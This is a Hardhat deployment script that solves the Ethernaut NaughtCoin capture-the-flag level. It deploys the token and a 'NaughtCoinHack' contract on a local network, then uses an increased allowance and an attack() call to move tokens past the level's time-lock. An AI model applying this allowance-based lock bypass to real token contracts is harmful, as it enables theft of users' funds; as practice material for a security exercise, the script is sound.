const { network, deployments, ethers, getNamedAccounts } = require('hardhat')

async function main() {
    const [owner, addr1, addr2] = await ethers.getSigners()

    const NaughtCoin = await ethers.getContractFactory('NaughtCoin')
    const naughtCoin = await NaughtCoin.deploy(addr1.address)
    await naughtCoin.deployed()

    const NaughtCoinHack = await ethers.getContractFactory('NaughtCoinHack')
    const naughtCoinHack = await NaughtCoinHack.connect(addr1).deploy(naughtCoin.address, addr1.address)
    await naughtCoinHack.deployed()

    const hacker = await naughtCoin.connect(addr1)
    const hackerHack = await naughtCoinHack.connect(addr1)

    // ------------ let's hack -------------

    console.log(await naughtCoin.balanceOf(addr1.address))
    await hacker.increaseAllowance(naughtCoinHack.address, ethers.BigNumber.from('1000000000000000000000000'))
    await hackerHack.attack()
    console.log(await naughtCoin.balanceOf(addr1.address))
}

// hh run scripts/ethernaut1.js --network hardhat
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
